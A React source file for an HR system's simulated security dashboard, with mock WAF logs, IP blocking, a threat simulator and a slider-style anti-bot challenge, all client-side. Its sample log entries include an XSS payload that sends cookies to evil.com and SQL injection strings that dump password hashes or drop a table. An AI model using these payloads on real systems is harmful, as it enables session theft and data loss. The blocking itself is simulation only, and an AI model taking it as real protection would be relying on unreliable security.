// components/providers/SecurityProvider.tsx
'use client';

import React, { createContext, useContext, useState, useEffect, useRef } from 'react';
import { Shield, ShieldAlert, ShieldCheck, Lock, RefreshCw, Cpu, ArrowRight } from 'lucide-react';
import { useAuth } from '@/components/providers/AuthProvider';

export interface SecurityEvent {
  id: string;
  timestamp: string;
  ipAddress: string;
  userAgent: string;
  type: 'SQL_INJECTION' | 'XSS_ATTEMPT' | 'BOT_CRAWLER' | 'BRUTE_FORCE' | 'RATE_LIMIT_EXCEEDED';
  severity: 'MEDIUM' | 'HIGH' | 'CRITICAL';
  status: 'BLOCKED' | 'CHALLENGED' | 'LOGGED';
  details: string;
}

interface SecurityContextType {
  antiBotMode: boolean;
  setAntiBotMode: (val: boolean) => void;
  rateLimit: number; // requests per minute
  setRateLimit: (val: number) => void;
  wafStrictness: 'STANDARD' | 'STRICT';
  setWafStrictness: (val: 'STANDARD' | 'STRICT') => void;
  blockedIps: string[];
  blockIp: (ip: string, reason: string) => void;
  unblockIp: (ip: string) => void;
  clearAllBlockedIps: () => void;
  securityLogs: SecurityEvent[];
  addSecurityLog: (event: Omit<SecurityEvent, 'id' | 'timestamp'>) => void;
  clearSecurityLogs: () => void;
  simulateThreat: (type: 'CRAWL' | 'BRUTE' | 'SQLI' | 'XSS' | 'SELF_BLOCK') => void;
  unblockSelf: () => void;
}

const SecurityContext = createContext<SecurityContextType | undefined>(undefined);

// Initial Mock Security Logs to populate the UI on first load
export const INITIAL_LOGS: SecurityEvent[] = [
  {
    id: 'sec-1',
    timestamp: new Date(Date.now() - 4 * 60000).toISOString(), // 4 mins ago
    ipAddress: '185.220.101.44',
    userAgent: 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
    type: 'BOT_CRAWLER',
    severity: 'MEDIUM',
    status: 'CHALLENGED',
    details: 'Crawl attempt on sensitive payroll index /payroll/runs/pr-1 without valid session headers.'
  },
  {
    id: 'sec-2',
    timestamp: new Date(Date.now() - 15 * 60000).toISOString(), // 15 mins ago
    ipAddress: '45.143.203.18',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    type: 'SQL_INJECTION',
    severity: 'CRITICAL',
    status: 'BLOCKED',
    details: 'WAF Filter matched SQL injection signature: UNION SELECT username, password_hash FROM Users.'
  },
  {
    id: 'sec-3',
    timestamp: new Date(Date.now() - 42 * 60000).toISOString(),
    ipAddress: '198.51.100.72',
    userAgent: 'Hydra/v9.5 (Brute Force Tool)',
    type: 'BRUTE_FORCE',
    severity: 'HIGH',
    status: 'BLOCKED',
    details: 'Authentication failure threshold exceeded: 15 failed logins in 30 seconds for user admin@hr.com.'
  },
  {
    id: 'sec-4',
    timestamp: new Date(Date.now() - 90 * 60000).toISOString(),
    ipAddress: '92.223.10.109',
    userAgent: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
    type: 'XSS_ATTEMPT',
    severity: 'HIGH',
    status: 'BLOCKED',
    details: 'Cross-Site Scripting (XSS) script tags detected in request query parameters: <script>fetch("http://evil.com/leak?c=" + document.cookie)</script>.'
  },
  {
    id: 'sec-5',
    timestamp: new Date(Date.now() - 120 * 60000).toISOString(),
    ipAddress: '185.220.101.44',
    userAgent: 'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
    type: 'BOT_CRAWLER',
    severity: 'MEDIUM',
    status: 'LOGGED',
    details: 'Low-frequency indexing on public login page /login. Captcha challenged bypassed.'
  },
  {
    id: 'sec-6',
    timestamp: new Date(Date.now() - 180 * 60000).toISOString(),
    ipAddress: '82.102.23.14',
    userAgent: 'python-requests/2.28.1',
    type: 'RATE_LIMIT_EXCEEDED',
    severity: 'HIGH',
    status: 'BLOCKED',
    details: 'Rate Limit Threshold Exceeded: 230 API requests in 60 seconds (Limit: 60/min). IP automatically blocked.'
  }
];

export function SecurityProvider({ children }: { children: React.ReactNode }) {
  const { user } = useAuth();
  
  // Settings State
  const [antiBotMode, setAntiBotMode] = useState<boolean>(true);
  const [rateLimit, setRateLimit] = useState<number>(60);
  const [wafStrictness, setWafStrictness] = useState<'STANDARD' | 'STRICT'>('STANDARD');
  
  // Blocklist and Logs state
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [securityLogs, setSecurityLogs] = useState<SecurityEvent[]>(INITIAL_LOGS);
  
  // Simulated Client IP & Block State (To allow self-testing)
  const [clientIp, setClientIp] = useState('192.168.1.88');
  const [isSelfBlocked, setIsSelfBlocked] = useState(false);
  const [blockReason, setBlockReason] = useState<string>('');
  
  // CAPTCHA / Slider verification states
  const [sliderVal, setSliderVal] = useState(0);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const sliderRef = useRef<HTMLInputElement>(null);

  // Client requests monitoring (Rate limit implementation)
  const requestTimes = useRef<number[]>([]);

  // Load from local storage
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const savedSettings = localStorage.getItem('hr_system_security_settings');
      if (savedSettings) {
        try {
          const parsed = JSON.parse(savedSettings);
          setAntiBotMode(parsed.antiBotMode ?? true);
          setRateLimit(parsed.rateLimit ?? 60);
          setWafStrictness(parsed.wafStrictness ?? 'STANDARD');
        } catch (e) {
          console.error(e);
        }
      }

      const savedBlocked = localStorage.getItem('hr_system_blocked_ips');
      if (savedBlocked) {
        try {
          setBlockedIps(JSON.parse(savedBlocked));
        } catch (e) {
          console.error(e);
        }
      }

      const savedLogs = localStorage.getItem('hr_system_security_logs');
      if (savedLogs) {
        try {
          setSecurityLogs(JSON.parse(savedLogs));
        } catch (e) {
          console.error(e);
        }
      }
    }
  }, []);

  // Save changes to localStorage helper
  const saveSettings = (newAntiBot: boolean, newLimit: number, newWaf: 'STANDARD' | 'STRICT') => {
    localStorage.setItem(
      'hr_system_security_settings',
      JSON.stringify({ antiBotMode: newAntiBot, rateLimit: newLimit, wafStrictness: newWaf })
    );
  };

  const updateAntiBotMode = (val: boolean) => {
    setAntiBotMode(val);
    saveSettings(val, rateLimit, wafStrictness);
  };

  const updateRateLimit = (val: number) => {
    setRateLimit(val);
    saveSettings(antiBotMode, val, wafStrictness);
  };

  const updateWafStrictness = (val: 'STANDARD' | 'STRICT') => {
    setWafStrictness(val);
    saveSettings(antiBotMode, rateLimit, val);
  };

  const blockIp = (ip: string, reason: string) => {
    setBlockedIps(prev => {
      if (prev.includes(ip)) return prev;
      const updated = [...prev, ip];
      localStorage.setItem('hr_system_blocked_ips', JSON.stringify(updated));
      return updated;
    });

    if (ip === clientIp) {
      setIsSelfBlocked(true);
      setBlockReason(reason);
    }
  };

  const unblockIp = (ip: string) => {
    setBlockedIps(prev => {
      const updated = prev.filter(item => item !== ip);
      localStorage.setItem('hr_system_blocked_ips', JSON.stringify(updated));
      return updated;
    });

    if (ip === clientIp) {
      setIsSelfBlocked(false);
      setBlockReason('');
      setSliderVal(0);
      setIsVerified(false);
    }
  };

  const clearAllBlockedIps = () => {
    setBlockedIps([]);
    localStorage.removeItem('hr_system_blocked_ips');
    setIsSelfBlocked(false);
    setBlockReason('');
    setSliderVal(0);
    setIsVerified(false);
  };

  const addSecurityLog = (event: Omit<SecurityEvent, 'id' | 'timestamp'>) => {
    const newLog: SecurityEvent = {
      ...event,
      id: `sec-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`,
      timestamp: new Date().toISOString()
    };
    setSecurityLogs(prev => {
      const updated = [newLog, ...prev].slice(0, 100); // cap at 100
      localStorage.setItem('hr_system_security_logs', JSON.stringify(updated));
      return updated;
    });
  };

  const clearSecurityLogs = () => {
    setSecurityLogs([]);
    localStorage.removeItem('hr_system_security_logs');
  };

  // Local Rate Limit Watcher
  // Triggers self-block if user requests (mouse clicks/navigation inside app) exceed the limit
  useEffect(() => {
    const handleUserRequest = () => {
      if (isSelfBlocked) return;
      if (rateLimit === 0) return; // Unlimited

      const now = Date.now();
      requestTimes.current.push(now);

      // Clean request times older than 60s
      requestTimes.current = requestTimes.current.filter(time => now - time < 60000);

      if (requestTimes.current.length > rateLimit) {
        // Exceeded rate limit! Block IP
        const logMsg = `Rate Limit Threshold Exceeded: ${requestTimes.current.length} requests in last 60 seconds (Limit: ${rateLimit}/min).`;
        addSecurityLog({
          ipAddress: clientIp,
          userAgent: navigator.userAgent,
          type: 'RATE_LIMIT_EXCEEDED',
          severity: 'HIGH',
          status: 'BLOCKED',
          details: logMsg
        });
        blockIp(clientIp, 'Rate Limit Exceeded (DDoS/Brute Force behavior detected)');
        // Clear request log to prevent loop
        requestTimes.current = [];
      }
    };

    window.addEventListener('click', handleUserRequest);
    return () => window.removeEventListener('click', handleUserRequest);
  }, [rateLimit, isSelfBlocked, clientIp]);

  // Threat Simulator Actions
  const simulateThreat = (type: 'CRAWL' | 'BRUTE' | 'SQLI' | 'XSS' | 'SELF_BLOCK') => {
    const randomIp = () => {
      const blocks = Array.from({ length: 4 }, () => Math.floor(Math.random() * 254) + 1);
      return blocks.join('.');
    };

    const agents = [
      'Mozilla/5.0 (compatible; Scrapy/2.8.0; +https://scrapy.org)',
      'Go-http-client/1.1',
      'curl/7.64.1',
      'Wget/1.20.3 (linux-gnu)',
      'python-requests/2.25.1'
    ];

    const ip = randomIp();
    const agent = agents[Math.floor(Math.random() * agents.length)];

    switch (type) {
      case 'CRAWL':
        addSecurityLog({
          ipAddress: ip,
          userAgent: agent,
          type: 'BOT_CRAWLER',
          severity: 'MEDIUM',
          status: antiBotMode ? 'CHALLENGED' : 'LOGGED',
          details: `Scraper Bot crawling secure directories /admin/audit-logs and /payroll/runs. ${antiBotMode ? 'Challenged with JS-puzzle.' : 'Logged (Anti-bot disabled).'}`
        });
        if (antiBotMode && Math.random() > 0.4) {
          blockIp(ip, 'Suspicious headless bot crawler index scanning');
        }
        break;
      case 'BRUTE':
        const targetEmail = ['admin@hr.com', 'hr@hr.com', 'payroll@hr.com', 'john.smith@hr.com'][Math.floor(Math.random() * 4)];
        addSecurityLog({
          ipAddress: ip,
          userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36',
          type: 'BRUTE_FORCE',
          severity: 'HIGH',
          status: 'BLOCKED',
          details: `Multiple credential attempts (8 failures) detected for profile "${targetEmail}". IP block enforced for 15 minutes.`
        });
        blockIp(ip, `Credential Brute Force attack targeting ${targetEmail}`);
        break;
      case 'SQLI':
        const payloads = [
          "1' OR '1'='1",
          "admin' --",
          "UNION SELECT null, username, passwordHash FROM User--",
          "SELECT * FROM EmployeeProfile WHERE id = 1; DROP TABLE EmployeeProfile; --"
        ];
        const payload = payloads[Math.floor(Math.random() * payloads.length)];
        addSecurityLog({
          ipAddress: ip,
          userAgent: 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
          type: 'SQL_INJECTION',
          severity: 'CRITICAL',
          status: 'BLOCKED',
          details: `Web Application Firewall (WAF) matched SQL Injection pattern in payroll query string. Parameter payload: "${payload}".`
        });
        blockIp(ip, `Critical WAF Rule Violation: SQL Injection signature detected`);
        break;
      case 'XSS':
        addSecurityLog({
          ipAddress: ip,
          userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Safari/537.36',
          type: 'XSS_ATTEMPT',
          severity: 'HIGH',
          status: 'BLOCKED',
          details: 'XSS payload injection blocked in comment feedback section. Input payload: <iframe src="javascript:alert(1)"></iframe>.'
        });
        blockIp(ip, 'XSS (Cross-Site Scripting) script injection payload');
        break;
      case 'SELF_BLOCK':
        // Enforce self block for testing
        addSecurityLog({
          ipAddress: clientIp,
          userAgent: navigator.userAgent,
          type: 'BOT_CRAWLER',
          severity: 'HIGH',
          status: 'CHALLENGED',
          details: 'Simulated self IP block requested. Redirected user to security verification challange portal.'
        });
        blockIp(clientIp, 'Simulated Self-IP Block for Anti-Bot demonstration');
        break;
    }
  };

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = parseInt(e.target.value);
    setSliderVal(val);

    if (val >= 100) {
      setIsVerifying(true);
      setTimeout(() => {
        setIsVerified(true);
        setIsVerifying(false);
        setTimeout(() => {
          unblockSelf();
        }, 1000);
      }, 1500);
    }
  };

  const unblockSelf = () => {
    unblockIp(clientIp);
  };

  // ─── Verification Overlay Pages ─────────────────────────────────────
  const renderSecurityBlockOverlay = () => {
    const isWafBlock = blockReason.includes('WAF') || blockReason.includes('SQL') || blockReason.includes('XSS');

    if (isWafBlock) {
      return (
        <div className="fixed inset-0 z-[9999] bg-slate-950 flex items-center justify-center p-4 font-sans text-slate-100">
          <div className="max-w-xl w-full bg-slate-900 border border-red-500/30 rounded-3xl p-8 shadow-2xl shadow-red-500/10 relative overflow-hidden">
            {/* Glow effect */}
            <div className="absolute -top-20 -left-20 w-48 h-48 rounded-full bg-red-500/5 blur-3xl"></div>
            <div className="absolute -bottom-20 -right-20 w-48 h-48 rounded-full bg-red-500/5 blur-3xl"></div>

            <div className="flex flex-col items-center text-center">
              <div className="w-16 h-16 rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-500 mb-6 animate-pulse">
                <ShieldAlert className="h-8 w-8" />
              </div>

              <h1 className="text-2xl font-black text-white tracking-tight uppercase mb-2">Access Denied (WAF Rule)</h1>
              <p className="text-sm text-slate-400 font-medium mb-6">
                Your connection has been blocked by the Web Application Firewall (WAF) of <span className="text-slate-200 font-bold">HR-SYSTEM</span>.
              </p>

              <div className="w-full bg-slate-950/70 border border-slate-800 rounded-2xl p-5 mb-8 text-left text-xs space-y-3 font-mono">
                <div className="flex justify-between border-b border-slate-800/60 pb-2">
                  <span className="text-slate-500 font-bold">REQUEST IP</span>
                  <span className="text-slate-300">{clientIp}</span>
                </div>
                <div className="flex justify-between border-b border-slate-800/60 pb-2">
                  <span className="text-slate-500 font-bold">VIOLATION TYPE</span>
                  <span className="text-red-400 font-bold">MALICIOUS_PAYLOAD</span>
                </div>
                <div className="flex justify-between border-b border-slate-800/60 pb-2">
                  <span className="text-slate-500 font-bold">TRIGGER</span>
                  <span className="text-slate-300 text-right max-w-[280px] truncate">{blockReason}</span>
                </div>
                <div className="flex justify-between pt-1">
                  <span className="text-slate-500 font-bold">TIMESTAMP</span>
                  <span className="text-slate-400">{new Date().toUTCString()}</span>
                </div>
              </div>

              <p className="text-xs text-slate-500 leading-relaxed mb-6 max-w-sm">
                If you believe this is a false positive, you can request temporary bypass credentials. For simulation testing, press the bypass button below.
              </p>

              <div className="flex gap-4 w-full">
                <button
                  onClick={unblockSelf}
                  className="flex-1 inline-flex items-center justify-center bg-red-600 hover:bg-red-500 text-white font-bold py-3 px-6 rounded-2xl text-xs transition-all cursor-pointer shadow-lg shadow-red-600/10 active:scale-[0.98]"
                >
                  <span>Bypass Block (Admin override)</span>
                </button>
              </div>
            </div>
          </div>
        </div>
      );
    }

    // Default Cloudflare-style Anti-Bot challenge overlay
    return (
      <div className="fixed inset-0 z-[9999] bg-[#f8fafc] flex items-center justify-center p-4 font-sans text-slate-800">
        <div className="max-w-lg w-full bg-white border border-slate-200/60 rounded-3xl p-8 shadow-xl relative overflow-hidden">
          <div className="flex flex-col items-center">
            {/* Cloudflare logo simulation */}
            <div className="flex items-center space-x-2.5 mb-8">
              <div className="p-2 bg-indigo-600 rounded-xl text-white">
                <Shield className="h-5 w-5" />
              </div>
              <span className="font-extrabold text-slate-800 text-lg tracking-wide uppercase">HR-SYSTEM Shield</span>
            </div>

            <h1 className="text-2xl font-black text-slate-800 tracking-tight text-center mb-2">Checking if the site connection is secure</h1>
            <p className="text-xs text-slate-400 font-semibold text-center mb-8 max-w-xs leading-normal">
              hr-system.com needs to review the security of your connection before proceeding.
            </p>

            {/* Interactive verification card */}
            <div className="w-full border border-slate-100 rounded-2xl p-6 bg-slate-50/50 shadow-inner mb-6 relative min-h-[120px] flex flex-col justify-center">
              {isVerified ? (
                <div className="flex flex-col items-center text-center space-y-2 animate-fade-in">
                  <div className="w-12 h-12 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-500 animate-scale-up">
                    <ShieldCheck className="h-6 w-6" />
                  </div>
                  <span className="text-xs font-bold text-slate-700">Verification Successful!</span>
                  <span className="text-[10px] text-slate-400">Restoring access...</span>
                </div>
              ) : isVerifying ? (
                <div className="flex flex-col items-center text-center space-y-3">
                  <RefreshCw className="h-6 w-6 text-indigo-500 animate-spin" />
                  <span className="text-xs font-bold text-slate-700">Evaluating client signatures...</span>
                  <span className="text-[10px] text-slate-400">Verifying IP: {clientIp}</span>
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="flex items-center justify-between text-[11px] text-slate-500 font-bold px-1">
                    <span className="flex items-center gap-1.5 text-indigo-500">
                      <Cpu className="h-3.5 w-3.5" />
                      Anti-Bot Challenge
                    </span>
                    <span>Slide to verify</span>
                  </div>

                  <div className="relative w-full h-12 bg-slate-200/70 border border-slate-300/30 rounded-2xl flex items-center overflow-hidden">
                    {/* Fill background */}
                    <div 
                      className="absolute inset-y-0 left-0 bg-indigo-500 transition-[width] duration-75"
                      style={{ width: `${sliderVal}%` }}
                    ></div>

                    {/* Instruction text */}
                    <span className="absolute inset-0 flex items-center justify-center text-[10px] font-bold text-slate-500 tracking-wider pointer-events-none select-none">
                      DRAG TO UNLOCK SHIELD
                    </span>

                    {/* Slider input */}
                    <input
                      ref={sliderRef}
                      type="range"
                      min="0"
                      max="100"
                      value={sliderVal}
                      onChange={handleSliderChange}
                      className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                    />

                    {/* Handle replication */}
                    <div 
                      className="absolute top-1 bottom-1 w-10 bg-white rounded-xl shadow border border-slate-200 flex items-center justify-center text-indigo-600 transition-[left] duration-75 pointer-events-none"
                      style={{ left: `calc(${sliderVal}% - ${sliderVal * 0.4}px + 4px)` }}
                    >
                      <ArrowRight className="h-4 w-4" />
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="w-full flex items-center justify-between text-[10px] text-slate-400 font-semibold border-t border-slate-100 pt-6 font-mono">
              <div className="flex items-center gap-1">
                <Lock className="h-3 w-3 text-indigo-500" />
                <span>Ray ID: {Math.random().toString(36).substring(2, 11).toUpperCase()}</span>
              </div>
              <span>Client IP: {clientIp}</span>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <SecurityContext.Provider
      value={{
        antiBotMode,
        setAntiBotMode: updateAntiBotMode,
        rateLimit,
        setRateLimit: updateRateLimit,
        wafStrictness,
        setWafStrictness: updateWafStrictness,
        blockedIps,
        blockIp,
        unblockIp,
        clearAllBlockedIps,
        securityLogs,
        addSecurityLog,
        clearSecurityLogs,
        simulateThreat,
        unblockSelf
      }}
    >
      {isSelfBlocked && renderSecurityBlockOverlay()}
      {children}
    </SecurityContext.Provider>
  );
}

export function useSecurity() {
  const context = useContext(SecurityContext);
  if (context === undefined) {
    throw new Error('useSecurity must be used within a SecurityProvider');
  }
  return context;
}
